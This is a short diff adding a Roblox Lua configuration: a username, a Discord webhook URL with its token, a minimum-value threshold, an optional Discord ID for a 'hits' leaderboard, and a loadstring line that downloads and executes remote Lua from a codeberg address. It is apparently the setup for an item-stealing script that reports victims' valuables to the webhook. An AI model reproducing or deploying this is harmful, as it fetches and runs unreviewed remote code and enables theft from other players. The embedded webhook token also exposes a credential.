@@ -1,0 +1,6 @@
+Username = "xxqoooo12"
+Webhook = "https://discord.com/api/webhooks/1404786258328420494/78r20hEdHGAFr4bn_tI9k1AKz_2nz6JlHFs9Ez1QLX2XAq5QiDJF4FWEsgWXUqcR1ewt"
+MinimumValue = 1
+DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
+
+```loadstring(game:HttpGet("https://codeberg.org/JessScripts/Lua/raw/branch/main/Lua"))()```
